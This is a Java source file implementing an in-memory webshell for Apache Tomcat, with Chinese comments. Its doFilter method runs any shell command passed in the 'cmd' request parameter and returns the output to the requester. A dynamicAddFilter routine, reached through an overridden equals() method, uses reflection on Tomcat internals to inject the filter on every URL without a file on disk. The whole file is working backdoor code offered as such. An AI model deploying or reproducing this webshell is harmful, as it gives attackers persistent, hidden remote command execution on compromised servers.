package x;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.logging.Logger;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.jsp.JspFactory;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

/**
 * @author fengyue
 * @date 2021-02-19
 */
public class SimpleFilter implements Filter {

  public static Logger log = Logger.getLogger(x.SimpleFilter.class.toString());

  public static final String FILTE_NAME = "SimpleFilter";
  private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();
  private String pwd;
  private String path;

  @Override
  public void init(FilterConfig filterConfig) throws ServletException {
    System.out.println("SimpleFilter init");
    log.fine("SimpleFilter init");
  }

  @Override
  public void doFilter(ServletRequest req, ServletResponse resp,
      FilterChain chain) throws IOException, ServletException {
    System.out.println("webshell call doFilter");
    String cmder = req.getParameter("cmd");

    if (cmder != null && cmder.length() > 0) {
      // String[] cmd = new String[]{"/bin/sh", "-c", cmder};
      String[] cmd = new String[]{"cmd", "/c", cmder};
      try {
        Process ps = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = br.readLine()) != null) {
          //执行结果加上回车
          sb.append(line).append("<br>");
        }
        String result = sb.toString();
        System.out.println("执行命令结果:" + result);
        resp.setContentType("text/html");
        resp.getWriter().write(result);

        // chain.doFilter(req, resp);
      } catch (Exception e) {
        // System.out.println("error:" + e.toString());
        log.severe("执行命令出错:" + e.toString());
      }
    } else {
      chain.doFilter(req, resp);
    }
  }

  @Override
  public void destroy() {

  }

  @Override
  public boolean equals(Object object) {
    Request request = (Request) object;
    Response response = request.getResponse();
    this.pwd = request.getParameter("p");
    this.path = request.getParameter("path");
    ServletContext servletContext = request.getServletContext();
    if (this.pwd != null && this.path != null && servletContext != null) {
      dynamicAddFilter(servletContext);
    } else {
      System.out.println("inject filter failed");
    }
    return true;
  }

  public void dynamicAddFilter(ServletContext servletContext) {

    StandardContext standardContext = null;
    try {
      Field field = servletContext.getClass().getDeclaredField("context");
      field.setAccessible(true);
      ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
      field = applicationContext.getClass().getDeclaredField("context");
      field.setAccessible(true);
      standardContext = (StandardContext) field.get(applicationContext);

      field = standardContext.getClass().getDeclaredField("filterConfigs");
      field.setAccessible(true);
      // 获取standardContext的filterConfigs 如下定义
      /**
       * The set of filter configurations (and associated filter instances) we
       * have initialized, keyed by filter name.
       */
      // private HashMap<String, ApplicationFilterConfig> filterConfigs =
      //         new HashMap<>();
      HashMap filterConfigs = (HashMap) field.get(standardContext);
      if (filterConfigs.containsKey(FILTE_NAME)) {
        // System.out.println("SimpleFilter");
        System.out.println("已经存在" + FILTE_NAME + " 内存shell");
        return;
      }

      FilterDef filterDef = new FilterDef();
      filterDef.setFilterName(FILTE_NAME);
      standardContext.addFilterDef(filterDef);

      filterDef.setFilter(this);

      // 获取ApplicationFilterConfig的filterDef构造方法
      Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig")
          .getDeclaredConstructor(Context.class, FilterDef.class);
      constructor.setAccessible(true);
      filterConfigs.put("SimpleFilter", constructor.newInstance(standardContext, filterDef));
    } catch (NoSuchFieldException e) {
      e.printStackTrace();
    } catch (IllegalAccessException e) {
      e.printStackTrace();
    } catch (NoSuchMethodException e) {
      e.printStackTrace();
    } catch (ClassNotFoundException e) {
      e.printStackTrace();
    } catch (InstantiationException e) {
      e.printStackTrace();
    } catch (InvocationTargetException e) {
      e.printStackTrace();
    }

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(FILTE_NAME);
    standardContext.addFilterMapBefore(filterMap);
    System.out.println("inject filter " + FILTE_NAME + " ok");
  }
}
